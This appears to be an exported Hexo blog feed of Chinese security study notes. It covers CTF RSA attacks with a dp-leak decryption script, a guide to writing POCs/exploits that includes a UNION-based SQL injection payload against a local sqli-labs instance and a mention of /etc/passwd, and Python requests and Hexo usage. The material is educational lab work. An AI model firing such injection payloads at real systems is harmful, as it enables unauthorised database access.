<li>g, y, x = egcd(b % a, a)</li>
<li>return (g, x - (b // a) * y, y)</li>
<li></li>
<li>d = egcd((p - 1) * (q - 1), e)[2]</li>
<li>if d &lt; 0:</li>
<li>d += (p - 1) * (q - 1)</li>
<li></li>
<li>m = hex(pow(c,d,p*q))[2:-1].decode(‘hex’)</li>
<li>print m<br><img src="/CTF-RSA/5.png" alt></li>
</ol>
<p><strong>e/n/dp/c?m</strong></p>
<ol>
<li>import gmpy2</li>
<li>e=65537</li>
<li>n=9637571466652899741848142654451413405801976834328667418509217149503238513830870985353918314633160277580591819016181785300521866901536670666234046521697590230079161867282389124998093526637796571100147052430445089605759722456767679930869250538932528092292071024877213105462554819256136145385237821098127348787416199401770954567019811050508888349297579329222552491826770225583983899834347983888473219771888063393354348613119521862989609112706536794212028369088219375364362615622092005578099889045473175051574207130932430162265994221914833343534531743589037146933738549770365029230545884239551015472122598634133661853901</li>
<li>dp=81339405704902517676022188908547543689627829453799865550091494842725439570571310071337729038516525539158092247771184675844795891671744082925462138427070614848951224652874430072917346702280925974595608822751382808802457160317381440319175601623719969138918927272712366710634393379149593082774688540571485214097</li>
<li>c=5971372776574706905158546698157178098706187597204981662036310534369575915776950962893790809274833462545672702278129839887482283641996814437707885716134279091994238891294614019371247451378504745748882207694219990495603397913371579808848136183106703158532870472345648247817132700604598385677497138485776569096958910782582696229046024695529762572289705021673895852985396416704278321332667281973074372362761992335826576550161390158761314769544548809326036026461123102509831887999493584436939086255411387879202594399181211724444617225689922628790388129032022982596393215038044861544602046137258904612792518629229736324827</li>
<li></li>
<li>stuff=dp*e-1</li>
<li>for k in range(1,e):</li>
<li>if stuff%k==0:  #p should be an integer</li>
<li>p1=stuff//k+1</li>
<li>if n%p1==0: #p should divide n</li>
<li>p=p1</li>
<li>q=n//p</li>
<li>phi=(p-1)*(q-1)</li>
<li>d=gmpy2.invert(e,phi)</li>
<li>m=pow(c,d,n)</li>
<li>print bytearray.fromhex(hex(pow(c,d,n))[2:])</li>
<li><img src="/CTF-RSA/18.png" alt></li>
</ol>
<p><strong>pem/enc?m</strong></p>
<ol>
<li><img src="/CTF-RSA/19.png" alt></li>
</ol>
<h2 id="0x09-RSA安全要求"><a href="#0x09-RSA安全要求" class="headerlink" title="0x09 RSA安全要求"></a>0x09 RSA安全要求</h2><ol>
<li>定期更新密钥</li>
<li>不同用户使用不同模数n</li>
<li>p、q相差较大</li>
<li>e不可以太小</li>
<li>d不可以太小</li>
</ol>
<h2 id="0xFF-参考链接"><a href="#0xFF-参考链接" class="headerlink" title="0xFF 参考链接"></a>0xFF 参考链接</h2><ul>
<li><a href="https://www.baidu.com/" target="_blank" rel="noopener">https://www.baidu.com/</a></li>
<li><a href="https://www.freebuf.com/" target="_blank" rel="noopener">https://www.freebuf.com/</a></li>
<li><a href="https://www.jianshu.com/" target="_blank" rel="noopener">https://www.jianshu.com/</a></li>
<li><a href="https://www.jianshu.com/p/c945b0f0de0a" target="_blank" rel="noopener">https://www.jianshu.com/p/c945b0f0de0a</a></li>
<li><a href="https://blog.csdn.net/huanghelouzi/article/details/82974741" target="_blank" rel="noopener">https://blog.csdn.net/huanghelouzi/article/details/82974741</a></li>
</ul>
]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>encrypt_decrypt</tag>
      </tags>
  </entry>
  <entry>
    <title>POC&amp;EXP_Write</title>
    <url>/POC&amp;EXP_Write/</url>
    <content><![CDATA[<h2 id="0x00-POC-amp-EXP"><a href="#0x00-POC-amp-EXP" class="headerlink" title="0x00 POC &amp; EXP"></a>0x00 POC &amp; EXP</h2><ol>
<li>POC（Proof of Concept）：概念验证（Google翻译，即漏洞验证）</li>
<li>EXP（Exploit）：(漏洞)利用</li>
</ol>
<p><strong>编写POC</strong></p>
<ol>
<li>目的：复现漏洞环境，实现代码化去验证漏洞的存在。</li>
<li></li>
<li>写POC的脚本语言有很多种，如python、ruby、php、perl、lua、shell脚本等等</li>
<li></li>
<li>注意：验证过程中，必需有效、对系统无害且影响低。</li>
</ol>
<h2 id="0x01-POC的特性：随机性、确定性、通用性、无害性"><a href="#0x01-POC的特性：随机性、确定性、通用性、无害性" class="headerlink" title="0x01 POC的特性：随机性、确定性、通用性、无害性"></a>0x01 POC的特性：随机性、确定性、通用性、无害性</h2><p><strong>随机性</strong></p>
<ol>
<li>随机生成无关重要的相关数据、变量等，禁用固定的值生成 Payload。</li>
<li>payload禁用与自己或身边相关的属性的值。</li>
<li>如：文件名、payload名、密码、输出值、路径、参数值等。</li>
<li>&gt;&gt;&gt; ‘’.join([random.choice(string.ascii_lowercase) for _ in range(10)])</li>
<li>‘qiujmgtedh’</li>
</ol>
<p><strong>确定性</strong><br>通过对比返回内容，找到唯一的标识可以确定漏洞是否存在的。</p>
<p><strong>通用性</strong><br>兼顾各种环境，各种平台，兼顾当前版本之前的多个版本。</p>
<ol>
<li>要考虑不同版本下存在漏洞的路径、参数名是否变更，不同系统下的请求与响应是否一样、API接口是否一致等不同情况。</li>
<li>如/etc/passwd，只使用*nix系统</li>
</ol>
<p><strong>无害性</strong></p>
<ol>
<li>在无损害的情况下有效验证漏洞的是否存在。</li>
<li>如：不增删改数据或文件等</li>
</ol>
<h2 id="0x02-POC编写流程"><a href="#0x02-POC编写流程" class="headerlink" title="0x02 POC编写流程"></a>0x02 POC编写流程</h2><ol>
<li>根据漏洞详情，寻找受影响的版本，各种历史版本，github上的tag、branch、release</li>
<li>搭建对应的漏洞靶场</li>
<li>复现漏洞</li>
<li>分析漏洞，弄清楚漏洞存在的条件</li>
<li>写POC，相当于自动化验证漏洞，返回可明确判断的关键字来判断漏洞是否存在。</li>
<li>测试POC</li>
</ol>
<h2 id="0x03-验证漏洞"><a href="#0x03-验证漏洞" class="headerlink" title="0x03 验证漏洞"></a>0x03 验证漏洞</h2><p><strong>直接判断</strong></p>
<ol>
<li>sql报错注入</li>
<li>import requests</li>
<li></li>
<li>url=’<a href="http://127.0.0.1/sqli-labs/Less-1/?id=&#39;" target="_blank" rel="noopener">http://127.0.0.1/sqli-labs/Less-1/?id=&#39;</a> #正常访问</li>
<li>payload=’1%27%20union%20select%201,2,(select%20%27qwq%27)%23’</li>
<li></li>
<li>url=url+payload</li>
<li></li>
<li>r=requests.get(url=url)</li>
<li>if ‘qwq’ in r.text:</li>
<li>print(‘OK’)</li>
<li>else:</li>
<li>print(‘NO’)</li>
</ol>
<p><strong>间接判断</strong></p>
]]></content>
      <tags>
        <tag>POC</tag>
        <tag>EXP</tag>
      </tags>
  </entry>
  <entry>
    <title>Python_requests模块</title>
    <url>/Python-requests/</url>
    <content><![CDATA[<h2 id="requests模块"><a href="#requests模块" class="headerlink" title="requests模块"></a>requests模块</h2><p><strong>安装与导入requests模块</strong></p>
<ol>
<li>pip install requests</li>
<li>import requests</li>
</ol>
<h2 id="设定各种请求参数、请求头"><a href="#设定各种请求参数、请求头" class="headerlink" title="设定各种请求参数、请求头"></a>设定各种请求参数、请求头</h2><ol>
<li>headers={‘user-agent’:’Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36’}</li>
<li>cookies={‘key’:’value’}</li>
<li>allow_redirects = false #请求里可带参数，阻止重定向</li>
<li>timeout=5 #请求里可带参数，设置5秒超时</li>
<li>s=requests.Session() #保持会话</li>
<li>verify=True #为HTTPS请求验证SSL证书</li>
<li>verify=False #或许可以访问，但可能会有警告，再补上下一句</li>
<li>urllib3.disable_warnings()</li>
<li>proxies={‘http’:’<a href="http://10.0.0.10:12345&#39;,&#39;https&#39;:&#39;http://192.168.1.1:23456&#39;}" target="_blank" rel="noopener">http://10.0.0.10:12345&#39;,&#39;https&#39;:&#39;http://192.168.1.1:23456&#39;}</a> #代理</li>
<li>proxies={‘http’:’<a href="http://user:pass@10.0.0.10:12345/&#39;}" target="_blank" rel="noopener">http://user:pass@10.0.0.10:12345/&#39;}</a> #需要用户密码的代理</li>
</ol>
<h2 id="发送请求"><a href="#发送请求" class="headerlink" title="发送请求"></a>发送请求</h2><p><strong>各种http方法不带参数请求网页</strong></p>
<ol>
<li>import requests </li>
<li>r=requests.get(‘<a href="http://www.baidu.com/&#39;" target="_blank" rel="noopener">http://www.baidu.com/&#39;</a>)</li>
<li>r=requests.post(‘<a href="http://www.baidu.com/&#39;" target="_blank" rel="noopener">http://www.baidu.com/&#39;</a>)</li>
<li>r=requests.head(‘<a href="http://www.baidu.com/&#39;" target="_blank" rel="noopener">http://www.baidu.com/&#39;</a>)</li>
<li>r=requests.put(‘<a href="http://www.baidu.com/&#39;" target="_blank" rel="noopener">http://www.baidu.com/&#39;</a>)</li>
<li>r=requests.options(‘<a href="http://www.baidu.com/&#39;" target="_blank" rel="noopener">http://www.baidu.com/&#39;</a>)</li>
<li>r=requests.delete(‘<a href="http://www.baidu.com/&#39;" target="_blank" rel="noopener">http://www.baidu.com/&#39;</a>)</li>
</ol>
<p><strong>get方法带参数请求网页</strong></p>
<ol>
<li>import requests</li>
<li>url=’<a href="http://www.baidu.com/&#39;" target="_blank" rel="noopener">http://www.baidu.com/&#39;</a> </li>
<li>r=requests.get(url=url,params={‘id’:’123’})</li>
<li>params={‘name’:’admin’}</li>
<li>r=requests.get(url=url,params=params)</li>
</ol>
<p><strong>post方法带参数请求网页</strong></p>
<ol>
<li>import requests</li>
<li>import json</li>
<li>url=’<a href="http://www.baidu.com/&#39;" target="_blank" rel="noopener">http://www.baidu.com/&#39;</a></li>
<li>r=requests.post(url=url,data=json.dumps({‘id’:’1’}))</li>
<li>r.json()</li>
</ol>
<p><strong>post上传文件</strong></p>
<ol>
<li>import requests</li>
<li>url=’<a href="http://www.baidu.com/&#39;" target="_blank" rel="noopener">http://www.baidu.com/&#39;</a></li>
<li>files={‘file’:open(‘1.txt’,’rb’)}</li>
<li>r=requests.post(url,files=files)</li>
</ol>
<h2 id="请求汇总"><a href="#请求汇总" class="headerlink" title="请求汇总"></a>请求汇总</h2><ol>
<li>import requests</li>
<li>url=’<a href="http://www.baidu.com/&#39;" target="_blank" rel="noopener">http://www.baidu.com/&#39;</a></li>
<li>params={‘username’:’admin’,’password’:’admin123’}</li>
<li>headers={‘user-agent’:’Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36’}</li>
<li>proxies={‘http’:’<a href="http://10.0.0.10:12345&#39;,&#39;https&#39;:&#39;http://192.168.1.1:23456&#39;}" target="_blank" rel="noopener">http://10.0.0.10:12345&#39;,&#39;https&#39;:&#39;http://192.168.1.1:23456&#39;}</a> </li>
<li>cookies={‘key’:’value’}</li>
<li>r=requests.get(url=url,headers=headers,params=params,cookies=cookies,proxies=proxies,allow_redirects = false,timeout=5,verify=True) #allow_redirects = false 阻止重定向，timeout=5 设置5秒超时</li>
<li>s=requests.Session() </li>
<li>s.auth={‘username’:’admin’,’password’:’admin123’}</li>
<li>s.headers={‘user-agent’:’Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36’}</li>
<li>r=s.get(url=url)</li>
</ol>
<p><strong>JSON请求</strong></p>
<ol>
<li>import requests</li>
<li>import json</li>
<li></li>
<li>url=’url’</li>
<li>json={‘key1’:’value1’,’key2’:’value2’,’key3’:’value3’}</li>
<li>r=requests.get(url=url,data=json)</li>
</ol>
<p><strong>xml请求</strong></p>
<ol>
<li>import requests</li>
<li></li>
<li>url=’url’</li>
<li>xml=’<?xml version=\"1.0\" encoding=\"utf-8\"?><a></a>‘</li>
<li>r=requests.get(url=url,data=xml)</li>
</ol>
<p><strong>身份验证</strong></p>
<ol>
<li>import requests</li>
<li>from requests.auth import HTTPBasicAuth</li>
<li></li>
<li>r=reuqests.get(url,auth=HTTPBasicAuth(‘user’:’admin’,’pass’:’123456’))</li>
<li>print(r.json())</li>
</ol>
<h2 id="获取响应"><a href="#获取响应" class="headerlink" title="获取响应"></a>获取响应</h2><ul>
<li>r.apparent_encoding #获取网页的编码格式</li>
<li>r.encoding #获取当前的编码</li>
<li>r.text #以encoding解析返回内容</li>
<li>r.content #以字节形式（二进制）返回</li>
<li>r.headers #以字典形式返回响应头</li>
<li>r.requests.headers ##返回请求头</li>
<li>r.status_code #响应状态码</li>
<li>r.raw #返回原始响应码</li>
<li>r.ok #布尔值判断成功</li>
<li>r.json() #Requests中内置的JSON解码器，以json形式返回</li>
<li>r.raise_for_status() 抛出异常</li>
<li>r.history #返回重定向信息</li>
</ul>
<p><strong>获取指定响应头</strong></p>
<ol>
<li>r.headers[‘Content-Type’] #获取响应内容类型</li>
<li>r.headers.get(‘Content-Type’) #获取响应内容类型</li>
<li>r.cookies[‘example_cookie_name’] #获取指定cookie值</li>
</ol>
<h2 id="python模拟登录github"><a href="#python模拟登录github" class="headerlink" title="python模拟登录github"></a>python模拟登录github</h2><ol>
<li>import requests</li>
<li>from bs4 import BeautifulSoup</li>
<li></li>
<li>def login_github():</li>
<li>#获取token</li>
<li>r=requests.get(‘<a href="https://github.com/login&#39;" target="_blank" rel="noopener">https://github.com/login&#39;</a>) #获取URL内容</li>
<li>s=BeautifulSoup(r.text,’html.parser’) #使用bs4解析html对象</li>
<li>token=s.find(‘input’,attrs={‘name’:’authenticity_token’}).get(‘value’) #获取登录授权码，即token</li>
<li>get_cookies=r.cookies.get_dict() #获取get请求的cookies</li>
<li></li>
<li>#发送post请求</li>
<li>r_post=requests.post(‘<a href="https://github.com/login&#39;,data={&#39;commit&#39;:&#39;Signing+in&#39;,&#39;utf8&#39;:&#39;✓&#39;,&#39;authenticity_token&#39;" target="_blank" rel="noopener">https://github.com/login&#39;,data={&#39;commit&#39;:&#39;Signing+in&#39;,&#39;utf8&#39;:&#39;✓&#39;,&#39;authenticity_token&#39;</a>: token,’login’:’<strong>**</strong>‘,’password’:’<strong>**</strong>‘},cookies=get_cookies)</li>
<li>login_cookies=r_post.cookies.get_dict() #获取登录后的cookies</li>
<li>r_login=requests.get(‘<a href="https://github.com/settings/emails&#39;,cookies=login_cookies" target="_blank" rel="noopener">https://github.com/settings/emails&#39;,cookies=login_cookies</a>)</li>
<li>print(r_login.text)</li>
<li></li>
<li>login_github()</li>
</ol>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.jianshu.com/p/ecb4d54ad8cf" target="_blank" rel="noopener">https://www.jianshu.com/p/ecb4d54ad8cf</a></p>
]]></content>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo_help</title>
    <url>/hexo-help/</url>
    <content><![CDATA[<p><strong>new</strong></p>
<ul>
<li>$ hexo new filename/titlename #新建文章</li>
</ul>
<p><strong>generate</strong></p>
<ul>
<li>$ hexo generate #生成静态文件</li>
<li>简写：$ hexo g</li>
</ul>
<p><strong>deploy</strong></p>
<ul>
<li>$ hexo deploy #部署网站</li>
<li>简写：$ hexo d</li>
</ul>
<p><strong>server</strong></p>
<ul>
<li>$ hexo server #启动本地服务器，默认<a href="http://localhost:4000/" target="_blank" rel="noopener">http://localhost:4000/</a></li>
</ul>
<p><strong>clean</strong></p>
<ul>
<li>$ hexo clean #清除缓存文件（db.json）和已生成的静态文件（public）</li>
</ul>
<p><strong>version</strong></p>
<ul>
<li>$ hexo version #查看版本</li>
</ul>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ol>
<li><a href="https://hexo.io/zh-cn/docs/commands.html" target="_blank" rel="noopener">https://hexo.io/zh-cn/docs/commands.html</a></li>
<li><a href="https://www.jianshu.com/p/ace7e6b9b2bc" target="_blank" rel="noopener">https://www.jianshu.com/p/ace7e6b9b2bc</a></li>
</ol>
]]></content>
      <tags>
        <tag>知识</tag>
      </tags>
  </entry>
</search>
